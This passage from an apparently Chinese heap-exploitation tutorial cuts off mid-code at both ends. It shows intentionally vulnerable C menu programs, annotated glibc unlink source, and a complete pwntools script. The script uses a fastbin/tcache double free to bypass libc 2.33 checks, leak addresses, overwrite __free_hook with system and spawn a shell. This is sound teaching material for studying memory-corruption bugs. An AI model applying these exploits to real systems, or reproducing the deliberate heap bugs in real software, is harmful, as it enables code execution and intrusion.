class="hljs-keyword">if</span> (ind&gt;<span class="hljs-number">21</span> || chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ; <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="double-free-示例分析">double free 示例分析</h3><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-4.jpg" srcset="/img/loading.gif" lazyload alt="get_data函数代码" title="get_data函数代码"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在libc2.28之后对tcache bin进行了double free检测</span><br><span class="hljs-string">    所以不能直接通过tcache bin构造double free</span><br><span class="hljs-string">    不过也只是在一开始将chunk放入tcache bin时进行检测</span><br><span class="hljs-string">    而且没将tcache bin与fast bin联动起来</span><br><span class="hljs-string">    所以可以先将chunk放入fast bin中</span><br><span class="hljs-string">    然后随便创建几个chunk，减少一点tcache bin中的chunk数</span><br><span class="hljs-string">    然后将fast bin中的chunk放入tcache bin</span><br><span class="hljs-string">    这时在获取chunk时获取的chunk的地址与fast bin中的地址相同</span><br><span class="hljs-string">    这时将这个chunk的fd设置为自己本身</span><br><span class="hljs-string">    则可以将tcache bin中填入两个同一个chunk</span><br><span class="hljs-string">    这时再创建一个chunk，后面就可以在任意地址创建chunk了</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;double_free&#x27;</span>)<br>gdb.attach(p)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x61</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x4a8</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x58</span>,payload)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x500</span>)<br>show(<span class="hljs-number">7</span>)<br>libc_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>main_arena=libc_d-<span class="hljs-number">0x470</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-comment">## tcache ##</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>)<br><br>show(<span class="hljs-number">1</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_0=calc_fd(heap_d,<span class="hljs-number">0x290</span>+<span class="hljs-number">0x10</span>)-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br>heap=heap_0-<span class="hljs-number">0x290</span><br>heap_8=heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x60</span>*<span class="hljs-number">7</span>+<span class="hljs-number">0x4b0</span><br><br><span class="hljs-comment">## fast ##</span><br>free(<span class="hljs-number">8</span>)<br><br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x58</span>,p64(en_fd(heap_8+<span class="hljs-number">0x10</span>,heap_8)))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">18</span>,<span class="hljs-number">0x58</span>)<br><br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x58</span>,p64(en_fd(heap_8+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x58</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x58</span>,p64(system))<br>free(<span class="hljs-number">20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="unlink">unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    利用内存管理中合并两个相邻的空闲chunk的代码unlink</span><br><span class="hljs-comment">    来向程序中用来储存chunk地址的数组中写入这个数组的地址</span><br><span class="hljs-comment">    这样就可以修改数组中成员指向的位置</span><br><span class="hljs-comment">    就可以在任意地址进行读写了</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* gcc unlink.c -no-pie -o unlink */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    chunk_list[ind][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    buf[read(<span class="hljs-number">0</span>,buf,size_list[ind])]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ; <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="unlink代码分析">unlink代码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br> <br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>    <span class="hljs-comment">// 先检验chunk附近的堆布局是否合法</span><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br>    <span class="hljs-comment">// 检测双向链表是否合法  最重要的条件</span><br>    <br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-comment">// 将双向链表中的P 删除</span><br>  <br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">//当chunk属于large bin时，还需要将chunk从 nextsize双向链表中删除</span><br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br>        <br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>    &#125;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      <span class="hljs-comment">// 如果size 链表不为空，则直接将P 删除</span><br>&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="unlink-示例分析">unlink 示例分析</h3><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    程序中的edit中存在off by null</span><br><span class="hljs-string">    而且程序没有开启pie保护，</span><br><span class="hljs-string">    这说明我们已知的地址中有一个区域储存了chunk的地址</span><br><span class="hljs-string">    这样就可以构造</span><br><span class="hljs-string">    *(chunk-&gt;fd+0x18)=chunk</span><br><span class="hljs-string">    